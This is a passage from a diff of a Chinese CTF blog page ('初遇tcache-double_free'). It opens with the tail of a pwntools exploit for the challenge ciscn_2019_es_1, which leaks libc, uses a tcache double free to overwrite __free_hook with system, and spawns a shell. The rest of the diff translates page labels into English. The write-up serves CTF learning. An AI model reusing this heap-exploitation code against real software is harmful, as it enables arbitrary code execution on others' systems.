class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,26786)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">struct Chunk&#123;</span></span><br><span class="line"><span class="string">    Chunk* chunk;</span></span><br><span class="line"><span class="string">    int size;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,call</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the size of compary&#x27;s name\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input name:\n&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input compary call:\n&quot;</span>,call)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)<span class="comment"># 绕过tcache进入unsortedbin</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单的泄漏libc</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">bug()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook : &quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># glibc2.30才有的double free的检查</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache bin 中 1 -&gt; 1</span></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook),<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system),<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
 
         </div>
@@ -388,27 +388,27 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>标题:</strong> 初遇tcache-double_free</li>
-        <li><strong>作者:</strong> The Redefine Team</li>
-        <li><strong>创建于
+        <li><strong>Title:</strong> 初遇tcache-double_free</li>
+        <li><strong>Author:</strong> The Redefine Team</li>
+        <li><strong>Created at
                 :</strong> 2024-09-22 20:06:12</li>
         
             <li>
-                <strong>更新于
+                <strong>Updated at
                     :</strong> 2024-09-22 21:26:39
             </li>
         
         <li>
-            <strong>链接:</strong> https://redefine.ohevan.com/2024/09/22/初遇tcache-double-free/
+            <strong>Link:</strong> https://redefine.ohevan.com/2024/09/22/初遇tcache-double-free/
         </li>
         <li>
             <strong>
-                版权声明:
+                License:
             </strong>
             
 
             
-                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
             
         </li>
     </ul>
@@ -442,7 +442,7 @@
                             </span>
                             <span class="title flex justify-center items-center">
                                 <span class="post-nav-title-item">tcache_double_free_overlap</span>
-                                <span class="post-nav-item">上一篇</span>
+                                <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
                     </div>
@@ -455,7 +455,7 @@
                         >
                             <span class="title flex justify-center items-center">
                                 <span class="post-nav-title-item">伪随机+爆破canary+爆破PIE</span>
-                                <span class="post-nav-item">下一篇</span>
+                                <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
                                 <i class="fa-solid fa-chevron-right"></i>
@@ -472,7 +472,7 @@
                 <div class="comments-container mt-10 w-full ">
     <div id="comment-anchor" class="w-full h-2.5"></div>
     <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
-        评论
+        Comments
     </div>
     
 
@@ -517,7 +517,7 @@
         <div class="toc-content-container">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <div class="toc-title">目录</div>
+        <div class="toc-title">On this page</div>
         <div class="page-title">初遇tcache-double_free</div>
         <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ciscn-2019-es-1"><span class="nav-text">ciscn_2019_es_1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ida%E9%80%9F%E8%A7%88"><span class="nav-text">ida速览</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#add"><span class="nav-text">add</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#show"><span class="nav-text">show</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#call-free"><span class="nav-text">call(free)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90"><span class="nav-text">简单分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#gdb%E5%8A%A8%E8%B0%83"><span class="nav-text">gdb动调</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87tcache-%E6%B3%84%E9%9C%B2libc"><span class="nav-text">绕过tcache+泄露libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#double-free-getshell"><span class="nav-text">double free+getshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4EXP"><span class="nav-text">完整EXP</span></a></li></ol>
 
@@ -552,11 +552,11 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        共撰写了 32 篇文章
+                        32 posts in total
                     </span>
                     
                         <span>
-                            共 32.8k 字
+                            32.9k words in total
                         </span>
                     
                 </p>
@@ -567,26 +567,26 @@
             <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                 
                     <span id="busuanzi_container_site_uv" class="lg:!block">
-                        <span class="text-sm">访问人数</span>
+                        <span class="text-sm">VISITOR COUNT</span>
                         <span id="busuanzi_value_site_uv"></span>
                     </span>
                 
                 
                     <span id="busuanzi_container_site_pv" class="lg:!block">
-                        <span class="text-sm">总访问量</span>
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                         <span id="busuanzi_value_site_pv"></span>
                     </span>
                 
             </div>
         
         <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
-            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
-            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
         </div>
         
         
             <div>
-                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
             </div>
         
         
